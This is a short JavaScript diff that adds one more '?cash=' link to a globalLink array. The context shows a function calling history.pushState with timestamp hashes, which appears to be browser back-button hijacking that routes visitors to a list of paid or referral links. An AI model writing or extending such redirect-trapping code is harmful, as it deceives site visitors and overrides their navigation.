@@ -6,6 +6,7 @@ globalLink.push(apidomain + '?cash=tsyj');
 globalLink.push(apidomain + '?cash=xwfkys');
 globalLink.push(apidomain + '?cash=yysx');
 globalLink.push(apidomain + '?cash=zrl');
+globalLink.push(apidomain + '?cash=nkgg');
 
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
